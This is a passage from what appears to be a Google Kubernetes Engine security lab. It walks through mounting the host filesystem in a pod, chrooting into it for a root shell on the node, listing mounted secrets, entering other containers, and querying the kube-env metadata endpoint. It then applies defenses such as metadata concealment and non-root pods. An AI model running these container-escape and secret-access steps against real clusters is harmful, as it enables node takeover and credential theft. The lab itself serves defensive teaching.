/</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">EOF</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 428px;"></div><div class="CodeMirror-gutters" style="display: none; height: 428px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Run </span><code>kubectl get pod</code><span> and re-run until it&#39;s in the &quot;Running&quot; state:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kubectl get pod</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>(Output)</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">NAME &nbsp; &nbsp; &nbsp; READY &nbsp; STATUS &nbsp;  RESTARTS &nbsp; AGE</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">hostpath &nbsp; 1/1 &nbsp; &nbsp; Running &nbsp; 0 &nbsp; &nbsp; &nbsp; &nbsp;  30s</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Deploy a pod that mounts the host filesystem</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h2 id='task-4-explore-and-compromise-the-underlying-host'><span>Task 4. Explore and compromise the underlying host</span></h2><ol start='' ><li><p><span>Run the following to obtain a shell inside the pod you just created:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kubectl exec -it hostpath -- bash</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Switch to the pod shell&#39;s root filesystem point to that of the underlying host:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">chroot /rootfs /bin/bash</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>With those simple commands, the pod is now effectively a </span><code>root</code><span> shell on the node. You are now able to do the following:</span></p><figure class='table-figure'><table><thead><tr><th><span>run the standard docker command with full permissions</span></th><th><code>docker ps</code></th></tr></thead><tbody><tr><td><span>list docker images</span></td><td><code>docker images</code></td></tr><tr><td><code>docker run</code><span> a privileged container of your choosing</span></td><td><code>docker run --privileged &lt;imagename&gt;:&lt;imageversion&gt;</code></td></tr><tr><td><span>examine the Kubernetes secrets mounted</span></td><td><code>mount | grep volumes | awk &#39;{print $3}&#39; | xargs ls</code></td></tr><tr><td><code>exec</code><span> into any running container (even into another pod in another namespace)</span></td><td><code>docker exec -it &lt;docker container ID&gt; sh</code></td></tr></tbody></table></figure><p><span>Nearly every operation that the </span><code>root</code><span> user can perform is available to this pod shell. This includes persistence mechanisms like adding SSH users/keys, running privileged docker containers on the host outside the view of Kubernetes, and much more.</span></p><ol start='' ><li><p><span>To exit the pod shell, run </span><code>exit</code><span> twice - once to leave the </span><code>chroot</code><span> and another to leave the pod&#39;s shell:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">exit</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">exit</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><strong><span>Note:</span></strong><span> If did not return to cloud shell press ctrl+c</span></p><ol start='' ><li><p><span>Now you can delete the </span><code>hostpath</code><span> pod:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kubectl delete pod hostpath</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><h3 id='understand-the-available-controls'><span>Understand the available controls</span></h3><p><span>The next steps of this demo will cover:</span></p><ul><li><p><strong><span>Disabling the Legacy Compute Engine Metadata API Endpoint</span></strong><span> - By specifying a custom metadata key and value, the </span><code>v1beta1</code><span> metadata endpoint will no longer be available from the instance.</span></p></li><li><p><strong><span>Enable Metadata Concealment</span></strong><span> - Passing an additional configuration during cluster and/or node pool creation, a lightweight proxy will be installed on each node that proxies all requests to the Metadata API and prevents access to sensitive endpoints.</span></p></li><li><p><strong><span>Enable and Utilize Pod Security Admission</span></strong><span> - Enable the Pod Security Admission (PSA) controller in your GKE cluster. This provides the ability to enforce pod security standards that enhance your cluster&#39;s security posture.</span></p></li></ul><h2 id='task-5-deploy-a-second-node-pool'><span>Task 5. Deploy a second node pool</span></h2><p><span>To enable you to experiment with and without the Metadata endpoint protections in place, you&#39;ll create a second node pool that includes two additional settings. Pods that are scheduled to the generic node pool will not have the protections, and Pods scheduled to the second node pool will have them enabled.</span></p><p><strong><span>Note:</span></strong><span> Legacy endpoints were deprecated on September 30, 2020. In GKE versions 1.12 and newer, the </span><code>--metadata=disable-legacy-endpoints=true</code><span> setting is automatically enabled. The next command below explicitly defines it for clarity.</span></p><ul><li><p><span>Create the second node pool:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud beta container node-pools create second-pool --cluster=simplecluster --zone=$MY_ZONE --num-nodes=1 --metadata=disable-legacy-endpoints=true --workload-metadata-from-node=SECURE</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Deploy a second node pool</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h2 id='task-6-run-a-google-cloud-sdk-pod'><span>Task 6. Run a Google Cloud-SDK pod</span></h2><ol start='' ><li><p><span>In Cloud Shell, launch a single instance of the Google Cloud-SDK container that will be run only on the second node pool with the protections enabled and not run as the root user:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kubectl run -it --rm gcloud --image=google/cloud-sdk:latest --restart=Never --overrides='{ "apiVersion": "v1", "spec": { "securityContext": { "runAsUser": 65534, "fsGroup": 65534 }, "nodeSelector": { "cloud.google.com/gke-nodepool": "second-pool" } } }' -- bash</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p><span>Copied!</span></p><p><strong><span>Note:</span></strong><span> If you get a timed out error, run the command again.</span></p><ol start='' ><li><p><span>You should now have a bash shell inside the pod&#39;s container running on the node pool named </span><code>second-pool</code><span>. You should see the following:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">nobody@gcloud:/$</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>It may take a few seconds for the container to start and the command prompt to open.</span></p><p><span>If you don&#39;t see a command prompt, press </span><strong><span>Enter</span></strong><span>.</span></p><h3 id='explore-various-blocked-endpoints'><span>Explore various blocked endpoints</span></h3><ol start='' ><li><p><span>With the configuration of the second node pool set to </span><code>--workload-metadata-from-node=SECURE</code><span> , the following command to retrieve the sensitive file, </span><code>kube-env</code><span>, will now fail:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>(Output)</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">This metadata endpoint is concealed.</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><ol start='' ><li><p><span>But other commands to non-sensitive endpoints will still succeed if the proper HTTP header is passed:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/name</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>(Example Output)</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gke-simplecluster-second-pool-8fbd68c5-gzzp</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><ol start='' ><li><p><span>Exit out of the pod:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">exit</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>You should now be back in Cloud Shell.</span></p><h2 id='task-7-enforce-pod-security-standards'><span>Task 7. Enforce Pod Security 